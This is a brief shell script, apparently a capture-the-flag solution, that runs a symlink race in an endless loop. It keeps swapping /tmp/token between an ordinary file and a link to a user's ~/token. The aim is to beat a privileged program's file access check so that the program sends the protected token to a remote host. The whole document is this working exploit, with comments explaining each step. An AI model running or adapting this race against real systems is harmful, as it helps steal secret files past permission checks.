#!/bin/sh
while [ 1 ]
do
        rm -rf /tmp/token
        touch /tmp/token # this file will pass the file access check
        rm -rf /tmp/token
        ln -s ~/token /tmp/token # this link will allow us to send the token to the host
done
